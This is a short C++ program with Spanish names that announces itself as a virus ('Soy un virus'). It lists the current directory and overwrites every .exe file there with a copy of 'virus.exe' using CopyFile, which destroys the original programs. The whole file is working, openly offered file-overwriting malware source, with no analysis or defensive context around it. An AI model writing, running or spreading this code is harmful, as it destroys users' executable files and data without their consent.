#include <iostream>
#include <fstream>
#include <string.h>
#include <dirent.h>
#include <windows.h>
bool soloExe(std::string archivo);
int main(){
    std::cout<<"Soy un virus\n";
    std::string nombreArchivos;
    DIR *directorio;
    int tipo;
    struct dirent *elementos;
    if(directorio=opendir(".")){
        while (elementos=readdir(directorio))
        {
            nombreArchivos=elementos->d_name;
            tipo=elementos->d_type;
            if(nombreArchivos!=".." && nombreArchivos!="." && tipo==0 && soloExe(nombreArchivos) ){
                CopyFile("virus.exe",nombreArchivos.c_str(),false);
            }
        }
        
    }

    system("pause");
    return 0;
}
bool soloExe(std::string archivo){
    if(archivo.substr(archivo.find_last_of(".")+1)=="exe"){
        return true;
    }else{
        return false;
    }
}